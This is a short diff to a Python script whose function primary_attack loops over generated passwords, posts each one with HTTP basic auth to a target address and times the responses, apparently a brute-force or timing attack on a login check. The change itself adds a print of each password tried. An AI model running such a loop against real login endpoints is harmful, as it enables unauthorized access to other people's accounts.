@@ -33,6 +33,7 @@ def primary_attack(address, digits, username):
     data = {}
     passwords = password_generator(digits)
     for password in passwords:
+        print(password)
         start = time.perf_counter()
         req = requests.post(address, auth=(username, password))
         end = time.perf_counter()
